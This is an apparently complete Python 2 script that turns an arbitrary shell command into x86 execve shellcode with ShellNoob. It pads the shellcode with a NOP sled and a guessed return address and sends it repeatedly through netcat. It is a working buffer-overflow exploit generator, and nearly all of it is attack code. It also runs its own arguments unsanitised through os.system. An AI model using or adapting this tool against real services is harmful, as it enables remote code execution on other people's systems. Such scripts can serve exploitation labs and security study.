import os
from sys import argv
from shellnoob import ShellNoob

cmd = argv[1]
from_range = int(argv[2], 16)
to_range = int(argv[3], 16)
netcat = argv[4]

if len(cmd) % 4 is not 0:
    cmd += ' '*(4 - (len(cmd) % 4))

print cmd

cmd = cmd[::-1]

hex_code = "".join("{:02x}".format(ord(c)) for c in cmd)

count = 0

# print hex_code

str = ""
final_str = ""
shell_code = ".text\n.globl main\nmain:\nxor %eax,%eax\npush %eax\n"

for count in range(len(hex_code)):
    if count > 0 and count % 8 == 0:
        final_str += "push $0x%s \n" % str
        str = ""
    str += hex_code[count]
final_str += "push $0x%s \n" % str

shell_code += final_str + "movl %esp,%ebx\npush %eax\n" \
        "push %ebx\nmov %esp, %ecx\nmovl %eax, %edx\nmov $11,%al\nint $0x80\nxor %eax,%eax\nmov $1,%al" \
        "\nxor %ebx,%ebx\nint $0x80".encode("utf-8")

# output_file = open("shell.asm", "w")
# output_file.write(shell_code)
# output_file.close()

sn = ShellNoob(flag_intel=False)
hex_code = sn.asm_to_hex(shell_code)

hc = "\\x"
for i in range(0, len(hex_code)):
    if i > 0 and i%2 is 0:
        hc += "\\x"

    hc += hex_code[i]

diff = to_range - from_range - hc.count('x')

for i in range(0, 6):
    hc = i*"\\x90" + (diff/2 * "\\x90") + hc + (diff/4 * argv[2].decode())

    # print hc
    os.system("`python -c 'print " + hc + "'` | " + netcat)


